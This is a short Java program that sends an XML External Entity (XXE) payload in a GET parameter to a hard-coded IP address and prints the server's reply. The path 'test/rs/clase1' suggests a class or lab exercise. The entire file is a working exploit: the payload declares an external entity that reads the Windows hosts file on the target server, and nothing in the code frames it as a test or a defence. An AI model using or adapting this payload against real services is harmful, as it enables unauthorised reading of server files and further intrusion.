package get;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class JJ {
	public static void main(String[] args) throws ClientProtocolException, IOException {
		String At="<!DOCTYPE root [ <!ELEMENT root ANY > <!ENTITY windowsfile SYSTEM "+'"'+
				"file:///C:/Windows/System32/drivers/etc/hosts"+'"'+"> ]><root> <info>  <boot>&windowsfile;</boot> </info></root>";
		HttpClient client = new DefaultHttpClient();
		HttpGet request = new HttpGet("http://35.161.4.173:8080/test/rs/clase1/metodoget?version=xml"+"&Data="+URLEncoder.encode(At));
		HttpResponse response = client.execute(request);
		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
		String line = "";
        while ((line = rd.readLine()) != null) {
			System.out.println(line);
        }
	}
}
